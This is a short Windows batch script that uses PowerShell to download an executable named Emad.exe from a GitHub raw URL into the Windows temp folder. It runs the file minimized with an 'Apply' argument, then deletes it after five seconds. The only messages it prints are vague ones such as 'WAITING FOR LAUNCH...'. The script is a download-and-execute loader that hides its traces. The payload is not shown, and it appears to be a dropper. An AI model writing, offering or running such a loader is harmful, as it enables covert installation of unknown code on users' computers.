@echo off
set "url=https://github.com/emad8787/panel/raw/refs/heads/main/Emad.exe"
set "destination=C:\Windows\Temp\Emad.exe"
set "arguments=Apply"

echo WAITING FOR LAUNCH...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%destination%')"
echo WAITING ...
start /min "" "%destination%" %arguments%

timeout /t 5 /nobreak >nul 2>&1

echo ........
del "%destination%"
